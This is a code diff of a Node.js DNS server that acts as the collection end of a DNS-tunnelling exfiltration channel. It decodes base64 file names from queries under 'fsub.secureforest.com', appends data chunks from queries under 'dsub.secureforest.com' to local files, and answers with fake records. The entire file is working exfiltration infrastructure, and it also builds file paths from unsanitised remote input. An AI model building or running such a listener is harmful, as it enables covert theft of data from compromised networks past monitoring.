@@ -2,14 +2,16 @@ const dgram = require("dgram");
 const server = dgram.createSocket("udp4");
 const dnsPacket = require("dns-packet");
 const fs = require("fs");
-const FilenameRegex = /(\S+)\.fsub\.secureforest\.com/;
-const DataRegex = /(\S+)\.dsub\.secureforest\.com/;
 const UDP_IP = "0.0.0.0";
 const UDP_PORT = 53;
+
+const FilenameRegex = /(\S+)\.fsub\.secureforest\.com/; // Filename
+const DataRegex = /(\S+)\.dsub\.secureforest\.com/; // Data Payload
 
 let fileName = "./encoded/untagged.txt";
 const logger = fs.createWriteStream(fileName, { flags: "a" });
 server.bind(UDP_PORT, UDP_IP);
+console.log('Server listening on UDP port ' + UDP_PORT)
 
 function createReplyBuffer(id, name, reply) {
   try {
@@ -49,16 +51,15 @@ server.on("message", (msg, rinfo) => {
     const matchData = DataRegex.exec(dnsName);
     const matchFilename = FilenameRegex.exec(dnsName);
     if (matchFilename) {
-      const decoded = decodeBase64(matchFilename[1] + "=");
-      console.log("new file: " + decoded);
-      fileName = decoded;
-      fs.writeFileSync("./encoded/" + fileName, "");
+      const decoded = decodeBase64(`${matchFilename[1]}=`);
+      fileName = decoded.replace(/\n/g, "");
+      console.log(`Receiving new file: ${fileName}`);
+      fs.writeFileSync(`./encoded/${fileName}`, "");
       const buf = createReplyBuffer(dnsData.id, dnsName, "8.8.8.8");
       server.send(buf, rinfo.port, rinfo.address);
     }
     if (matchData) {
-      // console.log(matchData[1])
-      fs.appendFileSync("./encoded/" + fileName, matchData[1]); //
+      fs.appendFileSync(`./encoded/${fileName}`, matchData[1]); //
       const buf = createReplyBuffer(dnsData.id, dnsName, "8.8.8.8");
       server.send(buf, rinfo.port, rinfo.address);
     }
